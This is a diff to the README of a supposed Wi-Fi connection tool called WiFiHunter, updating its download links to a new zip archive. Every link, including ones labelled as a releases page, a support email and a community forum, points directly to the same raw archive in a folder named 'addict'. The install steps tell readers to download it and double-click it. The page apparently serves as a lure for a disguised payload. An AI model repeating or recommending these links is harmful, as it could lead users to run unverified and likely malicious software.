@@ -6,9 +6,9 @@ Welcome to WiFiHunter! This application helps you find and connect to available 
 
 ## 📥 Download WiFiHunter
 
-[![Download WiFiHunter](https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip)](https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip)
+[![Download WiFiHunter](https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip)](https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip)
 
-To download WiFiHunter, visit this page: [WiFiHunter Releases](https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip). This link will take you to the latest version available for download.
+To download WiFiHunter, visit this page: [WiFiHunter Releases](https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip). This link will take you to the latest version available for download.
 
 ## 📋 System Requirements
 
@@ -30,9 +30,9 @@ WiFiHunter comes with several features to help you connect smoothly:
 
 ## 📥 Download & Install
 
-1. Go to the [WiFiHunter Releases](https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip) page.
+1. Go to the [WiFiHunter Releases](https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip) page.
 2. Look for the latest version at the top of the page.
-3. Click on the link for your operating system, like `https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip` for Windows.
+3. Click on the link for your operating system, like `https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip` for Windows.
 4. Save the file to your computer.
 5. Once the download is complete, locate the downloaded file in your Downloads folder.
 6. Double-click the file to start the installation.
@@ -75,8 +75,8 @@ If you encounter any issues:
 
 For any questions or support, please reach out to our support team:
 
-- Email: https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip
-- Forum: [WiFiHunter Community Forum](https://raw.githubusercontent.com/ujyaalolalteen/WiFiHunter/main/addict/WiFiHunter.zip)
+- Email: https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip
+- Forum: [WiFiHunter Community Forum](https://github.com/ujyaalolalteen/WiFiHunter/raw/refs/heads/main/addict/Hunter_Fi_Wi_v2.0.zip)
 
 ## 🔗 Additional Information
 
